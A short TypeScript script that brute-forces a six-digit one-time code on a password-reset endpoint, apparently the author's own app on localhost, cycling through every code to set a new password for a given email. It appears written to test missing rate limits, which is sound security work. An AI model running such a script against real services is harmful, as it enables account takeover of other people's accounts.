import axios from "axios";

async function main(){
    const url = "http://localhost:3000/reset-password"
    const email = "dhruv@gmail.com"
    const newPassword = "sdsdsd"

    for(let i = 0;i<=999999;i++){
        const otp = i.toString().padStart(6, "0");
        try{
            const res = await axios.post(url,{
                email,
                otp,
                newPassword
            })

            if(res.status===200){
                console.log("🔥 OTP CRACKED:", otp);
                console.log(res.data);
                return;
            }
        }catch(err: any){
            if (err.response?.status !== 401) {
                console.log("Unexpected error:", err.message);
            }
        }
        console.log("Finished trying all OTPs.",otp);
    }
}

main()